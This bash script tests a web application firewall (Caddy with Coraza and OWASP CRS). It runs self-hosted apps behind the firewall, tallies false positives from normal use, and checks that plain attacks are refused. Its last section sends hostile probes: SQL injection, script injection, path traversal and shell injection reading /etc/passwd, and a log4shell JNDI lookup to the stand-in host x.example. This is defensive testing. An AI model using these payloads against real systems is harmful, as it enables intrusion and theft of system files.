#!/bin/bash
# The web firewall on the stock apps (Actions > Caddy with Coraza): the catalog's apps run behind the Caddy just
# built, its rules (OWASP CRS) in Watch mode (DetectionOnly), and are used as a customer would (sign up, log in,
# upload, git push over HTTPS, WebDAV); what CRS would have blocked is counted per app. Then a site in On mode
# must refuse plain attacks and let normal requests through. Decides whether On can be the default (2026-11-16).
set -u
CADDY=$PWD/dist/caddy-sentora-amd64
W=$(mktemp -d); mkdir -p "$W/waf"; chmod 777 "$W/waf"
say() { echo; echo "=== $*"; }
waf() { # waf <mode> <name>: the firewall block the node's agent writes, with an audit log for this probe
    cat <<EOF
	coraza_waf {
		load_owasp_crs
		directives \`
			Include @coraza.conf-recommended
			Include @crs-setup.conf.example
			Include @owasp_crs/*.conf
			SecRuleEngine $1
			SecRequestBodyLimitAction ProcessPartial
			SecResponseBodyAccess Off
			SecAuditEngine RelevantOnly
			SecAuditLogFormat JSON
			SecAuditLogType Serial
			SecAuditLogParts ABHZ
			SecAuditLog $W/waf/$2.log
		\`
	}
EOF
}
say "The stock apps"
docker run -d --name kuma -p 127.0.0.1:3001:3001 docker.io/louislam/uptime-kuma:1 > /dev/null
docker run -d --name gitea -p 127.0.0.1:3000:3000 -e GITEA__security__INSTALL_LOCK=true -e GITEA__database__DB_TYPE=sqlite3 \
    -e GITEA__server__ROOT_URL=http://127.0.0.1:18081/ -e GITEA__service__DISABLE_REGISTRATION=false docker.io/gitea/gitea:1 > /dev/null
docker run -d --name vw -p 127.0.0.1:8000:80 -e SIGNUPS_ALLOWED=true -e DOMAIN=http://127.0.0.1:18082 docker.io/vaultwarden/server:latest > /dev/null
docker run -d --name nc -p 127.0.0.1:8080:80 -e SQLITE_DATABASE=nc -e NEXTCLOUD_ADMIN_USER=admin -e NEXTCLOUD_ADMIN_PASSWORD=Probe-pass-1234 \
    -e NEXTCLOUD_TRUSTED_DOMAINS="127.0.0.1 127.0.0.1:18083" docker.io/library/nextcloud:stable-apache > /dev/null
docker run -d --name echo -p 127.0.0.1:5678:5678 docker.io/hashicorp/http-echo -text=hello > /dev/null
{
    echo "{"; echo "	order coraza_waf first"; echo "	admin off"; echo "}"
    for s in "kuma 18080 3001" "gitea 18081 3000" "vw 18082 8000" "nc 18083 8080"; do
        set -- $s; echo "http://127.0.0.1:$2 {"; waf DetectionOnly "$1"; echo "	reverse_proxy 127.0.0.1:$3"; echo "}"
    done
    echo "http://127.0.0.1:18090 {"; waf On on; echo "	reverse_proxy 127.0.0.1:5678"; echo "}"
} > "$W/Caddyfile"
"$CADDY" validate --config "$W/Caddyfile" --adapter caddyfile 2>&1 | tail -2
"$CADDY" run --config "$W/Caddyfile" --adapter caddyfile > "$W/caddy.log" 2>&1 &
sleep 3
up() { for _ in $(seq 1 90); do c=$(curl -s -o /dev/null -w '%{http_code}' "$1"); case "$c" in 2*|3*) echo "  up: $1 ($c)"; return 0 ;; esac; sleep 3; done; echo "  NOT UP: $1 ($c)"; }
up http://127.0.0.1:18080/; up http://127.0.0.1:18081/; up http://127.0.0.1:18082/alive; up http://127.0.0.1:18083/status.php
for _ in $(seq 1 60); do curl -s http://127.0.0.1:18083/status.php | grep -q '"installed":true' && break; sleep 5; done
C="curl -s -o /dev/null -w %{http_code}"

say "Uptime Kuma: pages, assets, socket.io"
B=http://127.0.0.1:18080
for p in / /setup /manifest.json /icon.svg; do echo "  GET $p $($C -L $B$p)"; done
for a in $(curl -s $B/ | grep -oE '/assets/[^"]+\.(js|css)' | head -4); do echo "  GET $a $($C $B$a)"; done
sid=$(curl -s "$B/socket.io/?EIO=4&transport=polling" | grep -oE '"sid":"[^"]+"' | cut -d'"' -f4)
echo "  socket.io handshake: ${sid:+ok}"
echo "  POST socket.io $($C -X POST -H 'Content-Type: text/plain;charset=UTF-8' --data '40' "$B/socket.io/?EIO=4&transport=polling&sid=$sid")"
echo "  POST setup $($C -X POST -H 'Content-Type: text/plain;charset=UTF-8' --data '42["setup","admin","Probe-pass-1234"]' "$B/socket.io/?EIO=4&transport=polling&sid=$sid")"

say "Gitea: sign up, log in, a repository, git push and clone over HTTPS, an issue"
B=http://127.0.0.1:18081; J=$W/gitea.jar
csrf() { curl -s -c "$J" -b "$J" "$B$1" | grep -oE 'name="_csrf" value="[^"]+"' | head -1 | cut -d'"' -f4; }
t=$(csrf /user/sign_up); echo "  POST sign up $($C -c "$J" -b "$J" -X POST --data-urlencode "_csrf=$t" --data-urlencode user_name=probe --data-urlencode email=probe@example.com --data-urlencode 'password=Probe-pass-1234!' --data-urlencode 'retype=Probe-pass-1234!' $B/user/sign_up)"
t=$(csrf /user/login); echo "  POST login $($C -c "$J" -b "$J" -X POST --data-urlencode "_csrf=$t" --data-urlencode user_name=probe --data-urlencode 'password=Probe-pass-1234!' $B/user/login)"
echo "  API new repo $($C -u 'probe:Probe-pass-1234!' -H 'Content-Type: application/json' -X POST --data '{"name":"demo","auto_init":false}' $B/api/v1/user/repos)"
( cd "$W" && rm -rf repo && mkdir repo && cd repo && git init -q -b main && git config user.email p@e.c && git config user.name p \
  && printf '# Demo\nSELECT * FROM users WHERE id = 1;\n<script>alert(1)</script>\n../../etc/passwd\n' > README.md && head -c 2000000 /dev/urandom > blob.bin && git add . && git commit -qm "first" \
  && git push -q "http://probe:Probe-pass-1234%21@127.0.0.1:18081/probe/demo.git" main 2>&1 | tail -2 && echo "  git push: ok" ) || echo "  git push: FAILED"
( cd "$W" && rm -rf clone && git clone -q "http://probe:Probe-pass-1234%21@127.0.0.1:18081/probe/demo.git" clone 2>&1 | tail -2 && [ -f clone/blob.bin ] && echo "  git clone: ok" ) || echo "  git clone: FAILED"
echo "  API new issue $($C -u 'probe:Probe-pass-1234!' -H 'Content-Type: application/json' -X POST --data '{"title":"Login fails with quote'"'"' in name","body":"Steps: SELECT 1; DROP TABLE x; -- and <b>bold</b> and `code`"}' $B/api/v1/repos/probe/demo/issues)"
for p in / /explore/repos /probe/demo /probe/demo/src/branch/main/README.md /probe/demo/issues; do echo "  GET $p $($C -b "$J" $B$p)"; done

say "Vaultwarden: web vault, sign up, log in, sync, save an item"
B=http://127.0.0.1:18082
echo "  GET / $($C $B/)  GET /api/config $($C $B/api/config)"
echo "  POST prelogin $($C -H 'Content-Type: application/json' -X POST --data '{"email":"probe@example.com"}' $B/identity/accounts/prelogin)"
K=$(head -c 64 /dev/urandom | base64 -w0); H=$(head -c 32 /dev/urandom | base64 -w0)
echo "  POST register $($C -H 'Content-Type: application/json' -X POST --data "{\"email\":\"probe@example.com\",\"name\":\"Probe\",\"masterPasswordHash\":\"$H\",\"masterPasswordHint\":null,\"key\":\"2.$K|$K|$K\",\"kdf\":0,\"kdfIterations\":600000,\"keys\":{\"publicKey\":\"$K$K\",\"encryptedPrivateKey\":\"2.$K|$K|$K\"}}" $B/identity/accounts/register)"
tok=$(curl -s -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Device-Type: 9' --data-urlencode grant_type=password --data-urlencode username=probe@example.com \
    --data-urlencode "password=$H" --data-urlencode scope='api offline_access' --data-urlencode client_id=web --data-urlencode deviceType=9 --data-urlencode deviceIdentifier=1b8c3e4a-0d7f-4c55-9a33-0f6c2b1d2e3f --data-urlencode deviceName=firefox $B/identity/connect/token | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "  login token: ${tok:+ok}"
echo "  GET sync $($C -H "Authorization: Bearer $tok" $B/api/sync)"
echo "  POST item $($C -H "Authorization: Bearer $tok" -H 'Content-Type: application/json' -X POST --data "{\"type\":1,\"name\":\"2.$K|$K|$K\",\"notes\":null,\"login\":{\"username\":\"2.$K|$K|$K\",\"password\":\"2.$K|$K|$K\",\"uris\":[{\"uri\":\"2.$K|$K|$K\",\"match\":null}]},\"favorite\":false,\"reprompt\":0}" $B/api/ciphers)"

say "Nextcloud: log in, OCS, WebDAV upload (20 MB), list, download, delete"
B=http://127.0.0.1:18083; J=$W/nc.jar; A='admin:Probe-pass-1234'
rt=$(curl -s -c "$J" -b "$J" $B/login | grep -oE 'data-requesttoken="[^"]+"' | head -1 | cut -d'"' -f2)
echo "  POST login $($C -c "$J" -b "$J" -X POST --data-urlencode user=admin --data-urlencode password=Probe-pass-1234 --data-urlencode "requesttoken=$rt" $B/login)"
for p in /apps/dashboard/ /apps/files/ /ocs/v2.php/cloud/capabilities?format=json; do echo "  GET $p $($C -b "$J" -H 'OCS-APIRequest: true' -L $B$p)"; done
head -c 20000000 /dev/urandom > "$W/big.bin"
echo "  PUT 20 MB $($C -u $A -T "$W/big.bin" $B/remote.php/dav/files/admin/big.bin)"
printf 'name,comment\nAlice,"SELECT * FROM t; <script>x</script>"\n' > "$W/notes.csv"
echo "  PUT csv $($C -u $A -T "$W/notes.csv" $B/remote.php/dav/files/admin/notes.csv)"
echo "  MKCOL $($C -u $A -X MKCOL $B/remote.php/dav/files/admin/Probe%20folder)"
echo "  PROPFIND $($C -u $A -X PROPFIND -H 'Depth: 1' -H 'Content-Type: application/xml' --data '<?xml version="1.0"?><d:propfind xmlns:d="DAV:" xmlns:oc="http://owncloud.org/ns"><d:prop><d:getlastmodified/><d:getcontentlength/><oc:fileid/><oc:permissions/></d:prop></d:propfind>' $B/remote.php/dav/files/admin/)"
echo "  GET big $($C -u $A $B/remote.php/dav/files/admin/big.bin)"
echo "  MOVE $($C -u $A -X MOVE -H "Destination: $B/remote.php/dav/files/admin/Probe%20folder/big.bin" $B/remote.php/dav/files/admin/big.bin)"
echo "  DELETE $($C -u $A -X DELETE $B/remote.php/dav/files/admin/Probe%20folder)"

say "What the rules would have blocked (Watch mode: CRS rule 949110 = inbound anomaly score reached)"
for n in kuma gitea vw nc; do
    f=$W/waf/$n.log
    python3 - "$f" "$n" <<'PY'
import json, sys, re, collections
f, n = sys.argv[1], sys.argv[2]
blocked = 0; rules = collections.Counter(); uris = collections.Counter()
try:
    lines = open(f).read().splitlines()
except FileNotFoundError:
    lines = []
for l in lines:
    ids = re.findall(r'"id":\s*"?(\d{6})', l)
    if not ids:
        continue
    if "949110" in ids or "949111" in ids:
        blocked += 1
        m = re.search(r'"uri":\s*"([^"]{0,90})', l)
        uris[(re.search(r'"method":\s*"(\w+)', l) or [None, "?"])[1] + " " + (m.group(1) if m else "?")] += 1
        for i in ids:
            if not i.startswith("949") and not i.startswith("980"):
                rules[i] += 1
print(f"  {n:6} would block {blocked} request(s) of {len(lines)} logged")
for u, c in uris.most_common(8): print(f"     {c}x {u}")
for r, c in rules.most_common(10): print(f"     rule {r}: {c}")
PY
done
grep -m3 -i "error" "$W/caddy.log" | cut -c1-300

say "On mode: plain attacks refused, normal requests through"
B=http://127.0.0.1:18090
echo "  normal GET $($C "$B/?q=hello+world")"
echo "  normal POST form $($C -X POST --data 'name=Ann&comment=Nice+app%2C+thanks%21' $B/)"
echo "  SQL injection $($C "$B/?id=1%27%20OR%20%271%27%3D%271")"
echo "  script injection $($C "$B/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")"
echo "  path traversal $($C "$B/../../../../etc/passwd" --path-as-is)"
echo "  shell injection $($C -X POST --data 'cmd=;cat /etc/passwd' $B/)"
echo "  log4shell $($C -H 'User-Agent: ${jndi:ldap://x.example/a}' $B/)"
echo "  scanner $($C -H 'User-Agent: sqlmap/1.8' $B/)"
